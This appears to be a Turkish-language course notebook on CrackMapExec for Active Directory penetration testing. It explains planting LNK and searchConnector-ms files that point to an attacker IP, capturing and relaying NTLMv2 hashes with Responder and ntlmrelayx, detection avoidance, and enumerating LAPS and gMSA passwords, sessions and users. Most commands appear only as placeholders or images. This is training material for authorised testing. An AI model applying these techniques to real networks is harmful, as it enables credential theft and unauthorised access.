+İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.
+
+---
+
+### Stealing Hashes
+
+Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.
+
+Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.
+
+Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.
+
+NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.
+
+
+### Slinky Modülü
+
+`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.
+
+Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.
+
+
+### Slinky Module Options
+
+{{CODE_BLOCK_112}}
+
+`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.
+
+
+### Chisel kullanarak bağlama
+
+Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**
+
+
+### Hedef Makine Chisel Sunucusuna Bağlanma
+
+{{CODE_BLOCK_113}}
+
+
+### NTLMv2 Hash'lerinin Çalınması
+İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:
+
+### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma
+
+{{CODE_BLOCK_114}}
+
+
+Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 
+
+**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.
+
+
+### Using Slinky
+
+{{CODE_BLOCK_115}}
+
+
+![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)
+
+**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.
+
+Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.
+
+LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 
+
+
+### Starting Responder
+
+{{CODE_BLOCK_116}}
+
+Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.
+
+NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.
+
+
+### **NTLM Relay**
+
+Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.
+
+Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz
+
+### Getting Relay List
+
+{{CODE_BLOCK_117}}
+
+
+**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.
+
+Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.
+
+### Execute NTLMRelayX
+
+{{CODE_BLOCK_118}}
+
+Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).
+
+Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:
+
+{{CODE_BLOCK_119}}
+
+Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:
+
+### Local Hesapları Test Etme
+
+{{CODE_BLOCK_120}}
+
+### Her Şeyi Temizleyin
+
+Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.
+
+### Cleanup
+
+{{CODE_BLOCK_121}}
+
+### drop-sc Modülü ile Hash'lerin Çalınması
+Bu bölümü tamamlamadan önce, **LNK** dışındaki bir dosya formatı kullanarak kimlik doğrulamayı zorlamanın başka bir yöntemine bakalım:[ **.searchConnector-ms**](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) ve **.library-ms** formatları. Bu dosya formatlarının çoğu Windows sürümünde varsayılan dosya ilişkilendirmeleri bulunur. Windows ile entegre olarak, belirtilen bir WebDAV paylaşımı gibi uzaktaki bir konumu gösterebilecek şekilde, herhangi bir konumdan içerik görüntülemelerini sağlarlar.
+
+Özünde, LNK dosyası ile aynı fonksiyonu yerine getirirler. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için Windows'ta search connectors ve library dosyalarını keşfetmek başlıklı [blog](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/) yazısını okuyabilirsiniz.
+
+CrackMapExec, paylaşılan bir klasörde bir searchConnector-ms dosyası oluşturmamızı sağlayan drop-sc adlı bir modüle sahiptir. Bunu kullanmak için, SMB fake sunucumuzu hedeflemek için URL seçeneğini belirtmemiz gerekir. Bu durumda, ntlmrelayx çalıştıran hostumuz. URL'nin çift ters eğik çizgi (\) ile kaçması gerekir, örneğin: URL=\\\\10.10.14.33\\secret .
+
+İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:
+
+* SHARE=name seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı WRITE izinlerine sahip tüm paylaşımlara yazacaktır
+
+* FILENAME=name seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “Belgeler” adında bir dosya oluşturacaktır.
+
+* Oluşturduğumuz dosyaları temizlemek istiyorsak CLEANUP=True seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
+
+Drop-sc'yi iş başında görelim:
+
+
+### Dropping a searchConnector-ms File
+
+![Pasted image 20241202202007.png](/img/user/resimler/Pasted%20image%2020241202202007.png)
+
+![Pasted image 20241202202025.png](/img/user/resimler/Pasted%20image%2020241202202025.png)
+
+Bir kullanıcı paylaşılan klasöre eriştiğinde ve ntlmrelayx dinlerken, hedef makineye de aktarım yapabilmeliyiz.
+
+
+### NTLMRelayx ve drop-sc Kullanarak Aktarma
+
+![Pasted image 20241202202103.png](/img/user/resimler/Pasted%20image%2020241202202103.png)
+![Pasted image 20241202202112.png](/img/user/resimler/Pasted%20image%2020241202202112.png)
+
+Son olarak, CLEANUP=True seçeneği ile .searchConnector-ms dosyasını temizleyebiliriz:
+
+
+### searchConnector-ms Dosyalarını Temizleme
+![Pasted image 20241202202155.png](/img/user/resimler/Pasted%20image%2020241202202155.png)
+![Pasted image 20241202202201.png](/img/user/resimler/Pasted%20image%2020241202202201.png)
+
+LNK dosyaları genellikle bu tür saldırılar için bilinir. .searchConnector-ms gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+
+
+### SMB ile Eşleme ve Numaralandırma
+
+CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:
+
+![Pasted image 20241202202635.png](/img/user/resimler/Pasted%20image%2020241202202635.png)
+![Pasted image 20241202202649.png](/img/user/resimler/Pasted%20image%2020241202202649.png)
+
+Daha önce çalışmamış olanları gözden geçirelim:
+
+### Hedefteki etkin oturumları / oturum açmış kullanıcıları numaralandırma
+
+Birden fazla hedefi tehlikeye attıysak, etkin oturumları kontrol etmeye değer olabilir, belki bir domain yöneticisi vardır ve çabamızı bu belirli hedefe odaklamamız gerekir. Bir bilgisayardaki kullanıcıları tanımlamak için --sessions ve --loggedon-users seçeneklerini kullanabiliriz. Oturumlar, kullanıcı oturum açmamış olsa bile kullanıcı kimlik bilgilerinin hedef makinede kullanıldığı anlamına gelir. Oturum açmış kullanıcılar kendi kendini açıklar; bir kullanıcının hedef makinede oturum açtığı anlamına gelir. Bloodhound, aktif oturumları bulmak için kullanabileceğimiz başka bir araçtır.
+
+
+### Sessions ve loggendon-users seçeneklerini kullanma
+![Pasted image 20241202203026.png](/img/user/resimler/Pasted%20image%2020241202203026.png)
+
+Belirli bir kullanıcıyı arıyorsak, --loggedon-users-filter seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, regex'i de destekler.
+
+
+### Oturum açmış kullanıcılarla filtre seçeneğini kullanma
+![Pasted image 20241202203114.png](/img/user/resimler/Pasted%20image%2020241202203114.png)
+![Pasted image 20241202203120.png](/img/user/resimler/Pasted%20image%2020241202203120.png)
+
+
+### Enumerate Computers
+
+CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar
+
+
+### Domain'deki Bilgisayarları Numaralandırma
+![Pasted image 20241202203511.png](/img/user/resimler/Pasted%20image%2020241202203511.png)
+
+Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.
+
+
+### Enumerate LAPS
+
+Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, --laps seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya --sam gibi diğer seçenekleri kullanabiliriz.
+
+![Pasted image 20241202203817.png](/img/user/resimler/Pasted%20image%2020241202203817.png)
+
+![Pasted image 20241202203835.png](/img/user/resimler/Pasted%20image%2020241202203835.png)
+
+![Pasted image 20241202203857.png](/img/user/resimler/Pasted%20image%2020241202203857.png)
+
+Not: Varsayılan yönetici hesabı adı “administrator” değilse, kullanıcı adını --laps kullanıcı adı seçeneğinden sonra ekleyin.
+
+
+### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute
+
+Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için RID Bruteforce'dur. BloodHound veya PowerView ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in --rid-brute seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
+
+
+### List Local Users
+
+![Pasted image 20241202204115.png](/img/user/resimler/Pasted%20image%2020241202204115.png)
+![Pasted image 20241202204130.png](/img/user/resimler/Pasted%20image%2020241202204130.png)
+![Pasted image 20241202204141.png](/img/user/resimler/Pasted%20image%2020241202204141.png)
+![Pasted image 20241202204153.png](/img/user/resimler/Pasted%20image%2020241202204153.png)
+![Pasted image 20241202204200.png](/img/user/resimler/Pasted%20image%2020241202204200.png)
+
+Varsayılan olarak, --rid-brute 4000'e kadar RID'leri zorlayarak nesneleri numaralandırır. Davranışını --rid-brute [MAX_RID] kullanarak değiştirebiliriz.
+
+rid-brute seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory nesnelerini almak için kullanılabilir. NULL Authentication etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
+
+
+### Enumerate Disks
+
+Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir --disks seçeneğine sahiptir.
+
+### Enumerating Disks
+![Pasted image 20241202204448.png](/img/user/resimler/Pasted%20image%2020241202204448.png)
+
+
+### Local ve Domain Gruplarını Numaralandırma
+Local-groups ile local grupları veya --groups ile domain gruplarını listeleyebiliriz.
+
+### Enumerating Local Groups
+![Pasted image 20241202204607.png](/img/user/resimler/Pasted%20image%2020241202204607.png)
+![Pasted image 20241202204629.png](/img/user/resimler/Pasted%20image%2020241202204629.png)
+
+
+### Enumerating Domain Groups
+![Pasted image 20241202204749.png](/img/user/resimler/Pasted%20image%2020241202204749.png)
+![Pasted image 20241202204830.png](/img/user/resimler/Pasted%20image%2020241202204830.png)
+
+Eğer grup üyelerini almak istiyorsak, --groups [GRUP ADI] kullanabiliriz.
+
+
+### Group **Members**
+![Pasted image 20241202204931.png](/img/user/resimler/Pasted%20image%2020241202204931.png)
+
+Not: Yazım sırasında --local-group yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
+
+
+### Querying WMI
+[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde yönetimsel işlemler için kullanılır. Remote bilgisayarlardaki yönetim görevlerini otomatikleştirmek için WMI komut dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
+
+Windows Yönetim Araçları'nın (WMI) birincil kullanım alanlarından biri, sınıf ve örnek bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm nesneleri döndürmesini isteyebiliriz.
+
+WMI, TCP port 135 ve bir dizi dinamik port kullanır: 49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri), TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+
+Örneğin, remote bir bilgisayarda Sysmon uygulamasının çalışıp çalışmadığını sorgulamak ve Caption ve ProcessId'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%' şeklindedir:
+
+
+### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma
+![Pasted image 20241202210123.png](/img/user/resimler/Pasted%20image%2020241202210123.png)
+
+WMI, sınıflarını hiyerarşik bir ad alanında düzenler. Bir sorgu gerçekleştirmek için, Class Name (Sınıf Adı) ve içinde bulunduğu Namespace'i (Ad Alanı) bilmemiz gerekir. Yukarıdaki örnekte, root\cimv2 namespace'indeki Win32_Process sınıfını sorgulayın. Namespace belirtmedik çünkü varsayılan olarak CME root\cimv2 kullanır (bu bilgiyi --help menüsünde görebiliriz)
+
+Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, root\WMI namespace'inde bulunan MSPower_DeviceEnable sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
+
+
+### Quering root\WMI Namespace
+![Pasted image 20241202212300.png](/img/user/resimler/Pasted%20image%2020241202212300.png)
+![Pasted image 20241202212343.png](/img/user/resimler/Pasted%20image%2020241202212343.png)
+
+Not: Genellikle, WMI'yı sorgulamak için yönetici ayrıcalıklarına sahip olmamız gerekir, ancak bir yönetici, WMI'yı sorgulamak için yönetici olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için yönetici olmayan bir hesap kullanabiliriz.
+
+WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için Microsoft'un Belgelerini okuyabiliriz.
+
+Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.
+
+
+### LDAP and RDP Enumeration
+Daha önce, CrackMapExec'te en çok kullanılan protokol olan SMB ile bazı numaralandırma seçeneklerini inceledik, ancak LDAP ve RDP protokolleri ile daha fazla numaralandırma seçeneği vardır
+
+Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir
+
+
+### LDAP & RDP Commands
+LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:
+![Pasted image 20241202225531.png](/img/user/resimler/Pasted%20image%2020241202225531.png)
+![Pasted image 20241202225542.png](/img/user/resimler/Pasted%20image%2020241202225542.png)
+
+Henüz çalışmadıklarımızı gözden geçirelim.
+
+
+### Enumerating Users and Groups
+
+SMB protokolünde yaptığımız gibi, LDAP ile de kullanıcıları ve grupları listeleyebiliriz:
+
+### Enumerating Users and Groups
+
+![Pasted image 20241202225710.png](/img/user/resimler/Pasted%20image%2020241202225710.png)
+![Pasted image 20241202225721.png](/img/user/resimler/Pasted%20image%2020241202225721.png)
+![Pasted image 20241202225733.png](/img/user/resimler/Pasted%20image%2020241202225733.png)
+![Pasted image 20241202225743.png](/img/user/resimler/Pasted%20image%2020241202225743.png)
+
+Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi /etc/hosts dosyasında yapılandırmamız gerekir
+
+
+### İlginç Hesap Özelliklerini Numaralandırma
+
+ldap protokolü, PASSWD_NOTREQD veya TRUSTED_FOR_DELEGATION bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta adminCount değeri 1 olan tüm hesapları sorgulayabiliriz.
+
+PASSWD_NOTREQD hesap denetimi özniteliği ayarlanmışsa, kullanıcı geçerli parola ilkesi uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir ( domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için --password-notrequired seçeneğini kullanabiliriz.
+
+
+### PASSWD_NOTREQD Özniteliğinin Tanımlanması
+
+![Pasted image 20241202230116.png](/img/user/resimler/Pasted%20image%2020241202230116.png)
+![Pasted image 20241202230124.png](/img/user/resimler/Pasted%20image%2020241202230124.png)
+
+TRUSTED_FOR_DELEGATION özniteliği ayarlanırsa, bir hizmetin altında çalıştığı hizmet hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani hizmeti talep eden bir istemciyi taklit edebilir. Bu saldırı türüne Kerberos Unconstrained Delegation adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
+
+### Kısıtlamasız Delegasyonun Belirlenmesi
+![Pasted image 20241202230729.png](/img/user/resimler/Pasted%20image%2020241202230729.png)
+
+adminCount özniteliği, SDProp işleminin bir kullanıcıyı koruyup korumadığını belirler. Bu işlemde, Active Directory'deki AdminSDHolder, korunan kullanıcı hesaplarının ACL izinleri için bir şablon görevi görür. Herhangi bir ACE hesabı değiştirilirse (örneğin, bir saldırgan tarafından), bu işlem tarafından korunan hesapların ACL izinleri, SDProp işlemi her çalıştığında şablon izin kümesine sıfırlanır; bu varsayılan olarak her 60 dakikada bir yapılır ancak değiştirilebilir. Değer 0 olarak ayarlanmışsa veya belirtilmemişse kullanıcı kapsam dışıdır. Öznitelik değeri 1 olarak ayarlanırsa kullanıcı korunur. Saldırganlar genellikle dahili bir ortamda hedef almak için adminCount özniteliği 1 olarak ayarlanmış hesapları ararlar. Bunlar genellikle ayrıcalıklı hesaplardır ve daha fazla erişime veya domain'in tamamen ele geçirilmesine yol açabilir.
+
+
+### adminCount Özniteliğini Sorgulama
+![Pasted image 20241202230901.png](/img/user/resimler/Pasted%20image%2020241202230901.png)
+![Pasted image 20241202230911.png](/img/user/resimler/Pasted%20image%2020241202230911.png)
+![Pasted image 20241202230921.png](/img/user/resimler/Pasted%20image%2020241202230921.png)
+
+
+### Domain SID'sini numaralandırma
+
+Bazı domain saldırıları, kullanıcı veya domain SID'si gibi belirli domain bilgilerini edinmemizi gerektirir. SID (Security IDentifier), bir bilgisayarın veya domain controller'ın sizi tanımlamak için kullandığı benzersiz bir kimlik numarasıdır. Domain sid, domain'i tanımlayan benzersiz bir kimlik numarasıdır. CrackMapExec kullanarak domain sid'sini almak için --get-sid bayrağını kullanabiliriz:
+
+
+### Gathering the Domain SID
+
+![Pasted image 20241202231106.png](/img/user/resimler/Pasted%20image%2020241202231106.png)
+![Pasted image 20241202231112.png](/img/user/resimler/Pasted%20image%2020241202231112.png)
+
+
+### Group Managed Service Accounts (gMSA)
+
+Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:
+
+* Otomatik parola yönetimi.
+* Basitleştirilmiş service principal name (SPN) yönetimi.
+* Yönetimi diğer yöneticilere devretme yeteneği
+
+Bu yönetilen hizmet hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
+
+Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.
+
+Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):
+
+
+### Enumerating Accounts with gMSA Privileges
+![Pasted image 20241202231402.png](/img/user/resimler/Pasted%20image%2020241202231402.png)
+![Pasted image 20241202231409.png](/img/user/resimler/Pasted%20image%2020241202231409.png)
+
+Yukarıdaki örnekte, engels kullanıcısının PrincipalsAllowedToRetrieveManagedPassword ayrıcalığına sahip olduğunu görebiliriz, bu da svc_inlaneadm$ gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın NTLM parola hash'ini almak için --gmsa seçeneğini kullanabiliriz.
+
+
+### gMSA Parolasını Edinme
+![Pasted image 20241202231528.png](/img/user/resimler/Pasted%20image%2020241202231528.png)
+
+Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.
+
+
+### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme
+![Pasted image 20241202231553.png](/img/user/resimler/Pasted%20image%2020241202231553.png)
+![Pasted image 20241202231601.png](/img/user/resimler/Pasted%20image%2020241202231601.png)
+
+
+### RDP Screenshots
+RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca NLA ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için --nlascreenshot seçeneğini kullanabiliriz
+
+
+### Enumerate Login Prompt
+![Pasted image 20241202231656.png](/img/user/resimler/Pasted%20image%2020241202231656.png)
+
+Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.
+
+
+### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
+![Pasted image 20241202231729.png](/img/user/resimler/Pasted%20image%2020241202231729.png)
+![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)
+
+Eğer bir kullanıcı adı ve parolamız varsa, --screenshot seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek --screentime ile birleştirilebilir, varsayılan olarak 10, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
+
+Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen --res seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek 1024x768 olarak ayarlanmıştır
+
+
+
+### Taking a Screenshot
+![Pasted image 20241202232439.png](/img/user/resimler/Pasted%20image%2020241202232439.png)
+![Pasted image 20241202232444.png](/img/user/resimler/Pasted%20image%2020241202232444.png)
+
+
+Not: --screentime ve --res isteğe bağlı bayraklardır.
+
+Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:
+
+
+### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
+![Pasted image 20241202232517.png](/img/user/resimler/Pasted%20image%2020241202232517.png)
+![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)
+
+
+Bu bölümde, hedeflerimizi arşivlemeye yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini araştırdık. Bir sonraki bölümde CrackMapExec kullanarak komutların nasıl çalıştırılacağı incelenecektir.
+
+
+
+
+
+### Command Execution
+
+Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce UAC'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca RID 500'e sahip yönetici hesabı (varsayılan yönetici) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
+
+![Pasted image 20241203095807.png](/img/user/resimler/Pasted%20image%2020241203095807.png)
+
+Varsayılan olarak, LocalAccountTokenFilterPolicy değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) yönetim görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si 500 ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm yönetici hesapları yönetim görevlerini yürütebilir.
+
+Yöneticinin yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) uzaktan yönetim görevlerini yerine getirmesini engellemektir. Bu, FilterAdministratorToken kayıt defteri değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (uzaktan yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
+
+
+
+### Command Execution as Administrator
+Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için -x seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
+
+
+### Bir Komutu Administrator Olarak Çalıştırma
+![Pasted image 20241203100035.png](/img/user/resimler/Pasted%20image%2020241203100035.png)
+![Pasted image 20241203100045.png](/img/user/resimler/Pasted%20image%2020241203100045.png)
+
+
+### RID 500 Dışı Hesap Olarak Komut Yürütme
+Yukarıdaki komutta, localadmin local user Administrators grubundadır, ancak uzak komutu çalıştıramaz:
+
+### Komutu localadmin olarak çalıştırma
+![Pasted image 20241203100238.png](/img/user/resimler/Pasted%20image%2020241203100238.png)
+
